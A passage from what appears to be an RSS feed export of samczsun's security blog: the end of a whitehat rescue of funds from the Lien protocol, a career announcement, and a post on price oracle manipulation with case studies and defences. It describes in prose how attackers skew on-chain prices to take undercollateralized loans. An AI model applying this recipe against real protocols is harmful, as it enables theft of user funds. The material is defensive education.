Processing these transactions in order would not withdraw the ~25,000 ETH itself, but would transfer 30,000 SBT+LBT tokens (which were “falsely” created) to the Lien team, allowing them to submit the final transaction to convert these tokens back into ETH. By transferring the infinitely mintable SBT+LBT tokens to Lien instead of ETH, we used more transactions to obscure how the attack worked from generalized front-runners (in case of a re-org), and I was able to avoid incurring $9.6M of income, even if for a moment.\nOnce we had generated 4 signed transactions, Sam and I spent a long time verifying their combinated behavior using a variety of multi-call transaction simulation tools. These 4 transactions, less than 1.5KB of data in total, were ready to heist $9.6M of assets, so long as no-one but SparkPool sees them until it is too late.\nI tested SparkPool’s whitehat endpoint with a meaningless transaction, and it worked exactly as expected: the transaction was not seen in the mempool, then suddenly appeared as part of a SparkPool block! It was like watching water vapor turn directly into ice without that pesky liquid phase.\nAfter adapting the transaction-creation script to feed the transactions directly to SparkPool’s new endpoint, it was time. I hesitated for a moment, but this was absolutely our best effort. We might lose $9.6M, but there would be no regrets: I hit “run” in IntelliJ. I’m not sure why, but I expected it to take a while, like node would understand the gravity of the situation and take its time. It did not; the transactions were sent in a matter of milliseconds.\nEveryone on the call began refreshing Etherscan with such vigor, I wondered if the Etherscan team would see a 3-minute spike in traffic. Since only SparkPool had the transactions, and only a portion of SparkPool’s hash rate was dedicated to this purpose, there was nothing to do but sweat and wait. Each block that appeared from another miner mocked us. Someone on the call would announce the miner to nervous chuckles. The ~15 blocks it took before our transactions were included felt like hours, but finally, we had our immaculate transactions: mined, in order, not reverted.\nWe watched with relief as more and more blocks were built on top of ours and our concerns about block re-orgs quickly faded. The Lien team was now in possession of enough SBT+LBT tokens to liquidate their entire system, and Sam went to coordinate the final phase of the rescue.\n\nNow that we had successfully transferred the tokens to Lien and there was no sign of any frontrunning, attempted or otherwise, we quickly pinged them with the good news. They confirmed that they received the tokens and immediately sent out a transaction to withdraw the bulk of the ether stored in the contract. Seconds later, a pending transaction appeared on Etherscan.\nAs we watched the loading indicator spin, I took the opportunity to reflect upon the events that lead to this moment. What had started as a quick glance at some contracts ended up turning into full-blown warroom that pulled in experts from around the world. Without Alex and Georgios, we wouldn’t have been able to make contact with the Lien developer. Without Scott, we would’ve been going into a rescue blind. Without Tina, we wouldn’t have been able to get in contact with CertiK or SparkPool. Without SparkPool, we would’ve been doomed to repeat the history that Dan had written about just weeks ago.\nAnd yet on a late Tuesday night, our unlikely group united under a common cause and worked tirelessly to try and ensure that over 9.6 million dollars would be returned to their rightful owners. All of our efforts over the last 7 hours led to this single pending transaction and the spinning dots that came with it.\nWhen the loading indicator finally turned into a green checkmark, the tense silence on the call gave way to a collective sigh of relief.\n[1]\nWe had escaped the dark forest.\n\nThis post was the culmination of the hard work of many people. Special thanks to Alex Wade, Scott Bigelow, Tina Zhen, Georgios Delkos, and SparkPool for being there when the ecosystem needed you most, as well as Alex Obadia and Dan Robinson for reviewing this post and providing feedback.\nIf you’re interested in the technical details behind the exploit, click here to learn more. If for some reason you still haven’t read Ethereum is a Dark Forest, you should definitely do so too.\n[1] The transaction","dc:creator":"samczsun","content":"On September 15, 2020, a small group of people worked through the night to rescue over 9.6MM USD from a vulnerable smart contract. This is our story.","contentSnippet":"On September 15, 2020, a small group of people worked through the night to rescue over 9.6MM USD from a vulnerable smart contract. This is our story.","guid":"5f6c30088fb3100001de1691","isoDate":"2020-09-24T16:29:39.000Z","from":"https://samczsun.com/rss/","hashId":"14684b4fd6837375dc4a992b3c33c03b"},{"creator":"samczsun","title":"Changing Lanes","link":"https://samczsun.com/changing-lanes/","pubDate":"Fri, 09 Oct 2020 15:19:06 GMT","content:encoded":"<img src=\"https://samczsun.com/content/images/2020/10/38961502_xl.jpg\" alt=\"Changing Lanes\"><p>In early 2020, I was given an opportunity to join <a href=\"https://www.trailofbits.com/\">Trail of Bits</a> over the summer. I was familiar with the high quality of work that they produced so I happily accepted the opportunity to meet and work with some of the brightest minds in software security.</p><p>During my time at Trail of Bits I worked on numerous engagements with coworkers who were experts in all sorts of subjects, from cryptography to binary analysis to formal verification. It was a truly great experience to be able to collaborate with and learn from so many talented individuals.</p><p>When I wasn&#x2019;t helping clients secure their software, I spent time improving <a href=\"https://github.com/crytic/slither\">Slither</a>, a static code analyzer for Solidity, alongside <a href=\"https://twitter.com/montyly\">Josselin Feist</a>. Although program analysis isn&#x2019;t my strong suit, I was able to improve quickly thanks to Josselin&#x2019;s mentorship and I&#x2019;m proud to have been able to <a href=\"https://github.com/crytic/slither/pulls?q=author%3Asamczsun\">contribute back</a> by implementing support for inline assembly as well as identifying and fixing a handful of internal bugs.</p><p>However, as summer drew to a close, I began considering what I wanted to do next. At the same time, <a href=\"https://twitter.com/matthuang\">Matt Huang</a> from <a href=\"https://www.paradigm.xyz/\">Paradigm</a> reached out with an offer to meet the team. Not knowing much about Paradigm beyond the fact that two people I respected, <a href=\"https://twitter.com/danrobinson\">Dan Robinson</a> and <a href=\"https://twitter.com/gakonst/\">Georgios Konstantopoulos</a>, worked there, I figured it couldn&#x2019;t hurt to chat.</p><p>After talking with Matt, <a href=\"https://twitter.com/FEhrsam\">Fred Ehrsam</a>, <a href=\"https://twitter.com/alanapalmedo\">Alana Palmedo</a>, <a href=\"https://twitter.com/g_co\">Gus Coldebella</a>, and the others on the team, I realized that Paradigm had amassed a group of extremely talented people, each a leader in their respective fields. The thought of being able to work alongside them and learn from their experiences was extremely exciting.</p><p>As such, I&#x2019;m happy to share that I&#x2019;m joining Paradigm as a Research Partner. My responsibilities will include helping evaluate the security posture of potential portfolio companies, assisting current portfolio companies, advancing the overall security of the Ethereum ecosystem, but most importantly, learning new things.</p><p>I&#x2019;d like to thank <a href=\"https://twitter.com/dguido/\">Dan Guido</a> and everyone at Trail of Bits for having me this summer as well as Matt Huang and everyone at Paradigm for bringing me on board. I&#x2019;d also like to thank the community for your continued support. I wouldn&#x2019;t be here without you, and I hope you&#x2019;ll join me in facing whatever the future holds.</p>","content:encodedSnippet":"In early 2020, I was given an opportunity to join Trail of Bits over the summer. I was familiar with the high quality of work that they produced so I happily accepted the opportunity to meet and work with some of the brightest minds in software security.\nDuring my time at Trail of Bits I worked on numerous engagements with coworkers who were experts in all sorts of subjects, from cryptography to binary analysis to formal verification. It was a truly great experience to be able to collaborate with and learn from so many talented individuals.\nWhen I wasn’t helping clients secure their software, I spent time improving Slither, a static code analyzer for Solidity, alongside Josselin Feist. Although program analysis isn’t my strong suit, I was able to improve quickly thanks to Josselin’s mentorship and I’m proud to have been able to contribute back by implementing support for inline assembly as well as identifying and fixing a handful of internal bugs.\nHowever, as summer drew to a close, I began considering what I wanted to do next. At the same time, Matt Huang from Paradigm reached out with an offer to meet the team. Not knowing much about Paradigm beyond the fact that two people I respected, Dan Robinson and Georgios Konstantopoulos, worked there, I figured it couldn’t hurt to chat.\nAfter talking with Matt, Fred Ehrsam, Alana Palmedo, Gus Coldebella, and the others on the team, I realized that Paradigm had amassed a group of extremely talented people, each a leader in their respective fields. The thought of being able to work alongside them and learn from their experiences was extremely exciting.\nAs such, I’m happy to share that I’m joining Paradigm as a Research Partner. My responsibilities will include helping evaluate the security posture of potential portfolio companies, assisting current portfolio companies, advancing the overall security of the Ethereum ecosystem, but most importantly, learning new things.\nI’d like to thank Dan Guido and everyone at Trail of Bits for having me this summer as well as Matt Huang and everyone at Paradigm for bringing me on board. I’d also like to thank the community for your continued support. I wouldn’t be here without you, and I hope you’ll join me in facing whatever the future holds.","dc:creator":"samczsun","content":"A reflection on my transition from Trail of Bits to Paradigm","contentSnippet":"A reflection on my transition from Trail of Bits to Paradigm","guid":"5f7cfdfac9ce5800018a6968","isoDate":"2020-10-09T15:19:06.000Z","from":"https://samczsun.com/rss/","hashId":"b6b4dc9881561326d224a746b5392e4e"},{"creator":"samczsun","title":"So you want to use a price oracle","link":"https://samczsun.com/so-you-want-to-use-a-price-oracle/","pubDate":"Mon, 09 Nov 2020 19:56:37 GMT","content:encoded":"<img src=\"https://samczsun.com/content/images/2020/11/130333232_xl.jpg\" alt=\"So you want to use a price oracle\"><p>In late 2019, I published a post titled &#x201C;<a href=\"https://samczsun.com/taking-undercollateralized-loans-for-fun-and-for-profit/\">Taking undercollateralized loans for fun and for profit</a>&#x201D;. In it, I described an economic attack on Ethereum dApps that rely on accurate price data for one or more tokens. It&apos;s currently late 2020 and unfortunately numerous projects have since made very similar mistakes, with the most recent example being the Harvest Finance hack which resulted in a collective loss of 33MM USD for protocol users.</p><p>While developers are familiar with vulnerabilities like reentrancy, price oracle manipulation is clearly not something that is often considered. Conversely, exploits based on reentrancy have fallen over the years while exploits based on price oracle manipulation are now on the rise. As such, I decided it was time that someone published a definitive resource on price oracle manipulation.</p><p>This post is broken down into three sections. For those who are unfamiliar with the subject, there is an introduction to oracles and oracle manipulation. Those who want to test their knowledge may skip ahead to the case studies, where we review past oracle-related vulnerabilities and exploits. Finally, we wrap up with some techniques developers can apply to protect their projects from price oracle manipulation.</p><h1 id=\"oracle-manipulation-in-real-life\">Oracle manipulation in real life</h1><p>Wednesday, December 1st, 2015. Your name is David Spargo and you&#x2019;re at the Peking Duk concert in Melbourne, Australia. You&#x2019;d like to meet the band in person but between you and backstage access stand two security guards, and there&#x2019;s no way they would let some average Joe walk right in.</p><p>How would the security guards react, you wonder, if you simply acted like you belonged. Family members would surely be allowed to visit the band backstage, so all you had to do was convince the security guards that you were a relative. You think about it for a bit and come up with a plan that can only be described as genius or absolutely bonkers.</p><p>After quickly setting everything up, you confidently walk up to the security guards. You introduce yourself as David Spargo, family of Peking Duk. When the guard asks for proof, you show them the irrefutable evidence - <a href=\"https://en.wikipedia.org/w/index.php?title=Peking_Duk&amp;oldid=693419023\">Wikipedia</a>.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2020/11/image.png\" class=\"kg-image\" alt=\"So you want to use a price oracle\" loading=\"lazy\" width=\"624\" height=\"292\" srcset=\"https://samczsun.com/content/images/size/w600/2020/11/image.png 600w, https://samczsun.com/content/images/2020/11/image.png 624w\"></figure><p>The guard waves you through and asks you to wait. A minute passes, then two. After five minutes, you wonder if you should make a run for it before law enforcement makes an appearance. As you&#x2019;re about to bail, Reuben Styles walks up and introduces himself. You walk with him to the green room where the band was so impressed with your ingenuity that you end up sharing a few beers together. Later, they share what happened on their Facebook page.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2020/11/image-1.png\" class=\"kg-image\" alt=\"So you want to use a price oracle\" loading=\"lazy\" width=\"417\" height=\"350\"></figure><h1 id=\"what-is-a-price-oracle\">What is a price oracle?</h1><p>A price oracle, generously speaking, is anything that you consult for price information. When Pam asks Dwight for the cash value of a Schrute Buck, Dwight is acting as a price oracle.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2020/11/image-2.png\" class=\"kg-image\" alt=\"So you want to use a price oracle\" loading=\"lazy\" width=\"482\" height=\"269\"></figure><p>On Ethereum, where everything is a smart contract, so too are price oracles. As such, it&#x2019;s more useful to distinguish between how the price oracle gets its price information. In one approach, you can simply take the existing off-chain price data from price APIs or exchanges and bring it on-chain. In the other, you can calculate the instantaneous price by consulting on-chain decentralized exchanges.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2020/11/image-24.png\" class=\"kg-image\" alt=\"So you want to use a price oracle\" loading=\"lazy\" width=\"590\" height=\"432\"></figure><p>Both options have their respective advantages and disadvantages. Off-chain data is generally slower to react to volatility, which may be good or bad depending on what you&#x2019;re trying to use it for. It typically requires a handful of privileged users to push the data on-chain though, so you have to trust that they won&#x2019;t turn evil and can&#x2019;t be coerced into pushing bad updates. On-chain data doesn&#x2019;t require any privileged access and is always up-to-date, but this means that it&#x2019;s easily manipulated by attackers which can lead to catastrophic failures.</p><h1 id=\"what-could-possibly-go-wrong\">What could possibly go wrong?</h1><p>Let&#x2019;s take a look at a few cases where a poorly integrated price oracle resulted in significant financial damage to a DeFi project.</p><h2 id=\"synthetix-skrw-oracle-malfunction\">Synthetix sKRW Oracle Malfunction</h2><p>Synthetix is a derivatives platform which allows users to be exposed to assets such as other currencies. To facilitate this, Synthetix (at the time) relied on a custom off-chain price feed implementation wherein an aggregate price calculated from a secret set of price feeds was posted on-chain at a fixed interval. These prices then allowed users to take long or short positions against supported assets.</p><p>On June 25, 2019, one of the price feeds that Synthetix relied on mis-reported the price of the Korean Won to be 1000x higher than the true rate. Due to <a href=\"https://blog.synthetix.io/response-to-oracle-incident/\">additional errors</a> elsewhere in the price oracle system, this price was accepted by the system and posted on-chain, where a trading bot quickly traded in and out of the sKRW market.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2020/11/image-25.png\" class=\"kg-image\" alt=\"So you want to use a price oracle\" loading=\"lazy\" width=\"768\" height=\"336\" srcset=\"https://samczsun.com/content/images/size/w600/2020/11/image-25.png 600w, https://samczsun.com/content/images/2020/11/image-25.png 768w\" sizes=\"(min-width: 720px) 720px\"></figure><p>In total, the bot was able to earn a profit of over 1B USD, although the Synthetix team was able to negotiate with the trader to return the funds in exchange for a bug bounty.</p><p>Synthetix correctly implemented the oracle contract and pulled prices from multiple sources in order to prevent traders from predicting price changes before they were published on-chain. However, an isolated case of one upstream price feed malfunctioning resulted in a devastating attack. This illustrates the risk of using a price oracle which uses off-chain data: you don&apos;t know how the price is calculated, so your system must be carefully designed such that all potential failure modes are handled properly.</p><h2 id=\"undercollateralized-loans\">Undercollateralized Loans</h2><p>As mentioned earlier, I published a post in September 2019 outlining the risks associated with using price oracles that relied on on-chain data. While I highly recommend reading the <a href=\"https://samczsun.com/taking-undercollateralized-loans-for-fun-and-for-profit/\">original post</a>, it is quite long and heavy in technical details which may make it hard to digest. Therefore, I&#x2019;ll be providing a simplified explanation here.</p><p>Imagine you wanted to bring decentralized lending to the blockchain. Users are allowed to deposit assets as collateral and borrow other assets up to a certain amount determined by the value of the assets they&#x2019;ve deposited. Let&#x2019;s assume that a user wants to borrow USD using ETH as collateral, that the current price of ETH is 400 USD, and that the collateralization ratio is 150%.</p><p>If the user deposits 375 ETH, they&#x2019;ll have deposited 150,000 USD of collateral. They can borrow 1 USD for every 1.5 USD of collateral, so they&#x2019;ll be able to borrow a maximum 100,000 USD from the system.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2020/11/image-26.png\" class=\"kg-image\" alt=\"So you want to use a price oracle\" loading=\"lazy\" width=\"635\" height=\"232\" srcset=\"https://samczsun.com/content/images/size/w600/2020/11/image-26.png 600w, https://samczsun.com/content/images/2020/11/image-26.png 635w\"></figure><p>But of course, on the blockchain it&#x2019;s not as simple as simply declaring that 1 ETH is worth 400 USD because a malicious user could simply declare that 1 ETH is worth 1,000 USD and then take all the money from the system. As such, it&#x2019;s tempting for developers to reach for the nearest price oracle shaped interface, such as the current spot price on Uniswap, Kyber, or another decentralized exchange.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2020/11/image-27.png\" class=\"kg-image\" alt=\"So you want to use a price oracle\" loading=\"lazy\" width=\"954\" height=\"221\" srcset=\"https://samczsun.com/content/images/size/w600/2020/11/image-27.png 600w, https://samczsun.com/content/images/2020/11/image-27.png 954w\" sizes=\"(min-width: 720px) 720px\"></figure><p>At first glance, this appears to be the correct thing to do. After all, Uniswap prices are always roughly correct whenever you want to buy or sell ETH as any deviations are quickly correct by arbitrageurs. However, as it turns out, the spot price on a decentralized exchange may be wildly incorrect during a transaction as shown in the example below.</p><p>Consider how a Uniswap reserve functions. The price is calculated based on the amount of assets held by the reserve, but the assets held by the reserve changes as users trade between ETH and USD. What if a malicious user performs a trade before and after taking a loan from your platform?</p><p>Before the user takes out a loan, they buy 5,000 ETH for 2,000,000 USD. The Uniswap exchange now calculates the price to be 1 ETH = 1,733.33 USD. Now, their 375 ETH can act as collateral for up to 433,333.33 USD worth of assets, which they borrow. Finally, they trade back the 5,000 ETH for their original 2,000,000 USD, which resets the price. The net result is that your loan platform just allowed the user to borrow an additional 333,333.33 USD without putting up any collateral.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2020/11/image-32.png\" class=\"kg-image\" alt=\"So you want to use a price oracle\" loading=\"lazy\" width=\"961\" height=\"605\" srcset=\"https://samczsun.com/content/images/size/w600/2020/11/image-32.png 600w, https://samczsun.com/content/images/2020/11/image-32.png 961w\" sizes=\"(min-width: 720px) 720px\"></figure><p>This case study illustrates the most common mistake when using a decentralized exchange as a price oracle - an attacker has almost full control over the price during a transaction and trying to read that price accurately is like reading the weight on a scale before it&#x2019;s finished settling. You&#x2019;ll probably get the wrong number and depending on the situation it might cost you a lot of money.</p><h2 id=\"synthetix-mkr-manipulation\">Synthetix MKR Manipulation</h2><p>In December 2019, Synthetix suffered another attack as a result of price oracle manipulation. What&#x2019;s notable about this one is that it crossed the barrier between on-chain price data and off-chain price data.</p><p>Reddit user u/MusaTheRedGuard <a href=\"https://www.reddit.com/r/ethfinance/comments/eexbfa/daily_general_discussion_december_24_2019/fby3i6n/\">observed</a> that an attacker was making some very suspicious trades against sMKR and iMKR (inverse MKR). The attacker first purchased a long position on MKR by buying sMKR, then purchased large quantities of MKR from the Uniswap ETH/MKR pair. After waiting a while, the attacker sold their sMKR for iMKR and sold their MKR back to Uniswap. They then repeated this process.</p><p>Behind the scenes, the attacker&#x2019;s trades through Uniswap allowed them to move the price of MKR on Synthetix at will. This was likely because the off-chain price feed that Synthetix relied on was in fact relying on the on-chain price of MKR, and there wasn&#x2019;t enough liquidity for arbitrageurs to reset the market back to optimal conditions.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2020/11/image-29.png\" class=\"kg-image\" alt=\"So you want to use a price oracle\" loading=\"lazy\" width=\"950\" height=\"1007\" srcset=\"https://samczsun.com/content/images/size/w600/2020/11/image-29.png 600w, https://samczsun.com/content/images/2020/11/image-29.png 950w\" sizes=\"(min-width: 720px) 720px\"></figure><p>This incident illustrates the fact that even if you think you&#x2019;re using off-chain price data, you may still actually be using on-chain price data and you may still be exposed to the intricacies involved with using that data.</p><h2 id=\"the-bzx-hack\">The bZx Hack</h2><p>In February 2020, bZx was hacked twice over the span of several days for approximately 1MM USD. You can find an excellent technical analysis of both hacks written by palkeo <a href=\"https://www.palkeo.com/en/projets/ethereum/bzx.html\">here</a>, but we will only be looking at the second hack.</p><p>In the second hack, the attacker first purchased nearly all of the sUSD on Kyber using ETH. Then, the attacker purchased a second batch of sUSD from Synthetix itself and deposited it on bZx. Using the sUSD as collateral, the attacker borrowed the maximum amount of ETH they were allowed to. They then sold back the sUSD to Kyber.</p><p>If you&#x2019;ve been paying attention, you&#x2019;ll recognize this as essentially the same undercollateralized loan attack, but using a different collateral and a different decentralized exchange.</p><h2 id=\"yvault-bug\">yVault Bug</h2><p>On July 25, 2020, I reported a bug to yEarn regarding the launch of their new yVault contracts. You can read the official writeup about this bug <a href=\"https://blog.trailofbits.com/2020/08/05/accidentally-stepping-on-a-defi-lego/\">here</a>, but I will briefly summarize it below.</p><p>The yVault system allows users to deposit a token and earn yield on it without needing to manage it themselves. Internally, the vault tracks the total amount of yVault tokens minted as well as the total amount of underlying tokens deposited. The worth of a single yVault token is given by the ratio of tokens minted to tokens deposited. Any yield the vault earns is spread across all minted yVault tokens (and therefore, across all yVault token holders).</p><p>The first yVault allowed users to earn yield on USDC by supplying liquidity to the Balancer MUSD/USDC pool. When a user supplies liquidity to Balancer pools, they receive BPT in return which can be redeemed for a proportion of the pool. As such, the yVault calculated the value of its holdings based on the amount of MUSD/USDC which could be redeemed with its BPT.</p><p>This seems like the correct implementation, but unfortunately the same principle as given before applies - the state of the Balancer pool during a transaction is not stable and cannot be trusted. In this case, because of the bonding curve that Balancer chose, a user who swaps between from USDC to MUSD will not receive a 1:1 exchange rate, but will in fact leave behind some MUSD in the pool. This means that the value of BPT can be temporarily inflated, which allows an attacker to manipulate the price at will and subsequently drain the vault.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2020/11/image-30.png\" class=\"kg-image\" alt=\"So you want to use a price oracle\" loading=\"lazy\" width=\"960\" height=\"860\" srcset=\"https://samczsun.com/content/images/size/w600/2020/11/image-30.png 600w, https://samczsun.com/content/images/2020/11/image-30.png 960w\" sizes=\"(min-width: 720px) 720px\"></figure><p>This incident shows that price oracles are not always conveniently labelled as such, and that developers need to be vigilant about what sort of data they&#x2019;re ingesting and consider whether that data can be easily manipulated by an unprivileged user.</p><h2 id=\"harvest-finance-hack\">Harvest Finance Hack</h2><p>On October 26, 2020, an unknown user hacked the Harvest Finance pools using a technique that you can probably guess by now. You can read the official post-mortem <a href=\"https://medium.com/harvest-finance/harvest-flashloan-economic-attack-post-mortem-3cf900d65217\">here</a>, but once again I&#x2019;ll summarize it for you: the attacker deflated the price of USDC in the Curve pool by performing a trade, entered the Harvest pool at the reduced price, restored the price by reversing the earlier trade, and exited the Harvest pool at a higher price. This resulted in over 33MM USD of losses.</p><h1 id=\"how-do-i-protect-myself\">How do I protect myself?</h1><p>By now, I hope that you&#x2019;ve learned to recognize the common thread - it&apos;s not always obvious that you&apos;re using a price oracle and if you don&apos;t follow the proper precautions, an attacker could trick your protocol into sending them all of your money. While there&#x2019;s no one-size-fits-all fix that can be prescribed, here are a few solutions that have worked for other projects in the past. Maybe one of them will apply to you too.</p><h2 id=\"shallow-markets-no-diving\">Shallow Markets, No Diving</h2><p>Like diving into the shallow end of a pool, diving into a shallow market is painful and might result in significant expenses which will change your life forever. Before you even consider the intricacies of the specific price oracle you&#x2019;re planning to use, consider whether the token is liquid enough to warrant integration with your platform.</p><h2 id=\"a-bird-in-the-hand-is-worth-two-in-the-bush\">A Bird in the Hand is Worth Two in the Bush</h2><p>It may be mesmerizing to see the potential exchange rate on Uniswap, but nothing&#x2019;s final until you actually click trade and the tokens are sitting in your wallet. Similarly, the best way to know for sure the exchange rate between two assets is to simply swap the assets directly. This approach is great because there&#x2019;s no take-backs and no what-ifs. However, it may not work for protocols such as lending platforms which are required to hold on to the original asset.</p><h2 id=\"almost-decentralized-oracles\">Almost Decentralized Oracles</h2><p>One way to summarize the problem with oracles that rely on on-chain data is that they&#x2019;re a little too up-to-date. If that&#x2019;s the case, why not introduce a bit of artificial delay? Write a contract which updates itself with the latest price from a decentralized exchange like Uniswap, but only when requested by a small group of privileged users. Now even if an attacker can manipulate the price, they can&#x2019;t get your protocol to actually use it.</p><p>This approach is really simple to implement and is a quick win, but there are a few drawbacks - in times of chain congestion you might not be able to update the price as quickly as you&#x2019;d like, and you&#x2019;re still vulnerable to sandwich attacks. Also, now your users need to trust that you&#x2019;ll actually keep the price updated.</p><h2 id=\"speed-bumps\">Speed Bumps</h2><p>Manipulating price oracles is a time-sensitive operation because arbitrageurs are always watching and would love the opportunity to optimize any suboptimal markets. If an attacker wants to minimize risk, they&#x2019;ll want to do the two trades required to manipulate a price oracle in a single transaction so there&#x2019;s no chance that an arbitrageur can jump in the middle. As a protocol developer, if your system supports it, it may be enough to simply implement a delay of as short as 1 block between a user entering and exiting your system.</p><p>Of course, this might impact composability and miner collaboration with traders is on the rise. In the future, it may be possible for bad actors to perform price oracle manipulation across multiple transactions knowing that the miner they&#x2019;ve partnered with will guarantee that no one can jump in the middle and take a bite out of their earnings.</p><h2 id=\"time-weighted-average-price-twap-\">Time-Weighted Average Price (TWAP)</h2><p>Uniswap V2 introduced a TWAP oracle for on-chain developers to use. The <a href=\"https://uniswap.org/docs/v2/core-concepts/oracles/\">documentation</a> goes into more detail on the exact security guarantees that the oracle provides, but in general for large pools over a long period of time with no chain congestion, the TWAP oracle is highly resistant to oracle manipulation attacks. However, due to the nature of its implementation, it may not respond quickly enough to moments of high market volatility and only works for assets for which there is already a liquid token on-chain.</p><h2 id=\"m-of-n-reporters\">M-of-N Reporters</h2><p>Sometimes they say that if you want something done right, you do it yourself. What if you gather up N trusted friends and ask them to submit what they think is the right price on-chain, and the best M answers becomes the current price?</p><p>This approach is used by many large projects today: Maker runs a set of <a href=\"https://developer.makerdao.com/feeds/\">price feeds</a> operated by trusted entities, Compound created the <a href=\"https://medium.com/compound-finance/announcing-compound-open-oracle-development-cff36f06aad3\">Open Oracle</a> and features reporters such as <a href=\"https://blog.coinbase.com/introducing-the-coinbase-price-oracle-6d1ee22c7068\">Coinbase</a>, and Chainlink aggregates price data from Chainlink operators and exposes it on-chain. Just keep in mind that if you choose to use one of these solutions, you&#x2019;ve now delegated trust to a third party and your users will have to do the same. Requiring reporters to manually post updates on-chain also means that during times of high market volatility and chain congestion, price updates may not arrive on time.</p><h1 id=\"conclusion\">Conclusion</h1><p>Price oracles are a critical, but often overlooked, component of DeFi security. Safely using price oracles is hard and there&#x2019;s plenty of ways to shoot both yourself and your users in the foot. In this post, we covered past examples of price oracle manipulation and established that reading price information during the middle of a transaction may be unsafe and could result in catastrophic financial damage. We also discussed a few techniques other projects have used to combat price oracle manipulation in the past. In the end though, every situation is unique and you might find yourself unsure whether you&#x2019;re using a price oracle correctly. If this is the case, feel free to <a href=\"https://samczsun.com/contact/\">reach out</a> for advice!</p><p><em>Special thanks to Dan Robinson and Georgios Konstantopoulos for reviewing this post, and to @zdhu_ and mongolsteppe for pointing out an error.</em></p>","content:encodedSnippet":"In late 2019, I published a post titled “Taking undercollateralized loans for fun and for profit”. In it, I described an economic attack on Ethereum dApps that rely on accurate price data for one or more tokens. It's currently late 2020 and unfortunately numerous projects have since made very similar mistakes, with the most recent example being the Harvest Finance hack which resulted in a collective loss of 33MM USD for protocol users.\nWhile developers are familiar with vulnerabilities like reentrancy, price oracle manipulation is clearly not something that is often considered. Conversely, exploits based on reentrancy have fallen over the years while exploits based on price oracle manipulation are now on the rise. As such, I decided it was time that someone published a definitive resource on price oracle manipulation.\nThis post is broken down into three sections. For those who are unfamiliar with the subject, there is an introduction to oracles and oracle manipulation. Those who want to test their knowledge may skip ahead to the case studies, where we review past oracle-related vulnerabilities and exploits. Finally, we wrap up with some techniques developers can apply to protect their projects from price oracle manipulation.\nOracle manipulation in real life\nWednesday, December 1st, 2015. Your name is David Spargo and you’re at the Peking Duk concert in Melbourne, Australia. You’d like to meet the band in person but between you and backstage access stand two security guards, and there’s no way they would let some average Joe walk right in.\nHow would the security guards react, you wonder, if you simply acted like you belonged. Family members would surely be allowed to visit the band backstage, so all you had to do was convince the security guards that you were a relative. You think about it for a bit and come up with a plan that can only be described as genius or absolutely bonkers.\nAfter quickly setting everything up, you confidently walk up to the security guards. You introduce yourself as David Spargo, family of Peking Duk. When the guard asks for proof, you show them the irrefutable evidence - Wikipedia.\n\nThe guard waves you through and asks you to wait. A minute passes, then two. After five minutes, you wonder if you should make a run for it before law enforcement makes an appearance. As you’re about to bail, Reuben Styles walks up and introduces himself. You walk with him to the green room where the band was so impressed with your ingenuity that you end up sharing a few beers together. Later, they share what happened on their Facebook page.\n\nWhat is a price oracle?\nA price oracle, generously speaking, is anything that you consult for price information. When Pam asks Dwight for the cash value of a Schrute Buck, Dwight is acting as a price oracle.\n\nOn Ethereum, where everything is a smart contract, so too are price oracles. As such, it’s more useful to distinguish between how the price oracle gets its price information. In one approach, you can simply take the existing off-chain price data from price APIs or exchanges and bring it on-chain. In the other, you can calculate the instantaneous price by consulting on-chain decentralized exchanges.\n\nBoth options have their respective advantages and disadvantages. Off-chain data is generally slower to react to volatility, which may be good or bad depending on what you’re trying to use it for. It typically requires a handful of privileged users to push the data on-chain though, so you have to trust that they won’t turn evil and can’t be coerced into pushing bad updates. On-chain data doesn’t require any privileged access and is always up-to-date, but this means that it’s easily manipulated by attackers which can lead to catastrophic failures.\nWhat could possibly go wrong?\nLet’s take a look at a few cases where a poorly integrated price oracle resulted in significant financial damage to a DeFi project.\nSynthetix sKRW Oracle Malfunction\nSynthetix is a derivatives platform which allows users to be exposed to assets such as other currencies. To facilitate this, Synthetix (at the time) relied on a custom off-chain price feed implementation wherein an aggregate price calculated from a secret set of price feeds was posted on-chain at a fixed interval. These prices then allowed users to take long or short positions against supported assets.\nOn June 25, 2019, one of the price feeds that Synthetix relied on mis-reported the price of the Korean Won to be 1000x higher than the true rate. Due to additional errors elsewhere in the price oracle system, this price was accepted by the system and posted on-chain, where a trading bot quickly traded in and out of the sKRW market.\n\nIn total, the bot was able to earn a profit of over 1B USD, although the Synthetix team was able to negotiate with the trader to return the funds in exchange for a bug bounty.\nSynthetix correctly implemented the oracle contract and pulled prices from multiple sources in order to prevent traders from predicting price changes before they were published on-chain. However, an isolated case of one upstream price feed malfunctioning resulted in a devastating attack. This illustrates the risk of using a price oracle which uses off-chain data: you don't know how the price is calculated, so your system must be carefully designed such that all potential failure modes are handled properly.\nUndercollateralized Loans\nAs mentioned earlier, I published a post in September 2019 outlining the risks associated with using price oracles that relied on on-chain data. While I highly recommend reading the original post, it is quite long and heavy in technical details which may make it hard to digest. Therefore, I’ll be providing a simplified explanation here.\nImagine you wanted to bring decentralized lending to the blockchain. Users are allowed to deposit assets as collateral and borrow other assets up to a certain amount determined by the value of the assets they’ve deposited. Let’s assume that a user wants to borrow USD using ETH as collateral, that the current price of ETH is 400 USD, and that the collateralization ratio is 150%.\nIf the user deposits 375 ETH, they’ll have deposited 150,000 USD of collateral. They can borrow 1 USD for every 1.5 USD of collateral, so they’ll be able to borrow a maximum 100,000 USD from the system.\n\nBut of course, on the blockchain it’s not as simple as simply declaring that 1 ETH is worth 400 USD because a malicious user could simply declare that 1 ETH is worth 1,000 USD and then take all the money from the system. As such, it’s tempting for developers to reach for the nearest price oracle shaped interface, such as the current spot price on Uniswap, Kyber, or another decentralized exchange.\n\nAt first glance, this appears to be the correct thing to do. After all, Uniswap prices are always roughly correct whenever you want to buy or sell ETH as any deviations are quickly correct by arbitrageurs. However, as it turns out, the 